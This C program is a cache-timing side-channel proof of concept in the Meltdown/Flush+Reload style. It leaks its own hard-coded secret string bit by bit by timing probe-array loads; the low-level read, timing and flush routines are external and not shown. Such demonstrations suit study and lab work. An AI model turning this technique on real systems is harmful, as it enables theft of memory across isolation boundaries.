#include <stdio.h>
#include <string.h>

// may need to fine-tune
#define CACHE_HIT_CYCLES 90

#define NUM_ATTEMPTS 2

extern unsigned int time_load(void *p);
extern void flush_cache(void *p);
extern char try_read(void *p, int s);

char probe_array[(1 << 7) << 8];
char *secret = "this is so secret!!!";

int main(int argc, char *argv[]) {
    size_t len = strlen(secret);

    for (int i = 0; i < len; i++) {
        unsigned char c = 0;
        void *target_addr = secret + i;

        for (int j = 7; j >= 0; j--) {    
            int hits_0 = 0, hits_1 = 0;
            
            for (int k = 0; k < NUM_ATTEMPTS; k++) {
                try_read(target_addr, 1 << j);
                
                unsigned int t0 = time_load(probe_array);
                unsigned int t1 = time_load(probe_array + ((1 << j) << 8));

                if (t0 < CACHE_HIT_CYCLES) {
                    hits_0++;
                }

                if (t1 < CACHE_HIT_CYCLES) {
                    hits_1++;
                }

                flush_cache(probe_array);
                flush_cache(probe_array + ((1 << j) << 8));
            }
            
            if (hits_0 > hits_1) {
                // add nothing, we deduced a 0 bit
            } else if (hits_1 > hits_0) {
                c += (1 << j);
            } else {
                // retry until we get a definitive answer
                j++;
            }
        }
        printf("%c", c);
    }

    printf("\n");
    return 0;
}
